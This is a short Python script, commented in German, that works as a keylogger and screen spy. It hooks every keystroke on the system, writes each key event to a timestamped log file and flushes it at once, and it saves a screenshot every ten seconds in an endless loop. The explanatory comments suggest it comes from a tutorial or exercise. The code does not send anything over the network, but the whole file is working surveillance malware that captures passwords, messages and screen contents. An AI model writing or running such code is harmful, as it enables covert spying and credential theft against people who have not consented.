import keyboard
import datetime
import pyautogui
import time
import os

# Erstelle Ordner Screenshots wenn nicht vorhanden
if not os.path.exists("screenshots"):
    os.mkdir("screenshots")

############################################################################
# Funktionsdeklaration
############################################################################
def on_key(key):
    #file.write(str(key) + "\n") # "key" ist eigentlich eine Instanz einer Klasse und muss erst in String konvertiert werden
    current_time = datetime.datetime.now().strftime("%Y%m%d_%H%M%S - ")
    file.write(current_time)
    file.write(str(key.__dict__) + "\n") # __dict__ -> Objekteigenschaften ausgeben -> Gibt Informatioen aus z.B. über alle Funktionen die Aufrufbar sind

    '''
    Problem file.write() sagt zu Python schreibe, WANN du es für richtig hälst
    Lösung -> Alles was in Warteschlange ist, soll sofort geschrieben werden -> file.flush()
    '''
    file.flush()
    #print(key)
    #print(key.time) # Aktuelle Uhrzeit

def make_screenshot():
    time.sleep(10) # Warte 10 sec.
    current_time = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    # print(current_time)
    filename = "./screenshots/" + current_time + ".jpg"
    print(filename)
    pyautogui.screenshot(filename)

############################################################################
# Eigentlicher Code Startet hier
############################################################################
keyboard.unhook_all() # Letzten Hook beenden

current_time = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
filename = f"./{current_time}_log.txt"
file = open(filename, "w", encoding="utf-8")
file.write("Log Start: \n")

while True: # Endlosschleife, über sleep wird jedoch ein Zeitblocker eingebaut, der den Prozessor entlastet
    keyboard.hook(on_key) # Hook starten zum aufnehmen aller kommenden Tastenanschläge
    # keyboard.wait(hotkey="esc") # Loop beenden mit bestimmter Taste
    # keyboard.wait() # Loop läuft ewig weiter
    make_screenshot()



